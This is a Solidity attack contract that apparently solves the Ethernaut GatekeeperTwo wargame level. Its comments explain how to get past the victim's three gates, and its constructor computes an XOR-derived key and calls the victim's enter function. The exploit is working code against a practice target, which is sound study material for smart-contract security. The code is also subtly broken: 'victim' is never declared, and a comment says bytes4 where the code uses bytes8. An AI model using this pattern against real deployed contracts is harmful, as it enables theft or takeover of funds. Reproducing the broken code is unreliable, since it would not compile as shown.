pragma solidity ^0.4.24;


  interface GatekeeperTwoInterface {
  function enter(bytes8 _gateKey) public returns (bool);
  }

  // Interface can also be used instead of importing the whole contract, as Interface does not store state variables on the EVM, and at such
  // reduce the size of the calling contract, and gas required for deployment of the calling contract

contract GatekeeperTwoAttack {

    /**the victim's gates are exploitable:
    gate1 = requires that the victim is called from a contract
    if it's called from another contract; msg.sender == contract.address rather than EOA = TX.ORIGIN
    gate2 = requires that x := extcodesize(caller) ==0;
    the solution to this is that all function calls need to come from the constructor! When a contract is first deployes, 
    the extcodesize of that address(caller) is 0 until the constructor is completed!
    gate3 = requires that gateKey is the bytes4 of the XOR of uint64(keccak256(msg.sender)) and uint64(0) - 1)
    from the XOR rule of if A ^ B = C then A ^ C = B
    **/
    constructor(address _victim) public {
        victim = GatekeeperTwoInterface(_victim);
        //msg.sender must be this (new) or calling contract address(i.e address(this))
        bytes8 key = bytes8(uint64(keccak256(address(this))) ^ uint64(0) - 1);
        victim.enter(key);
    }

}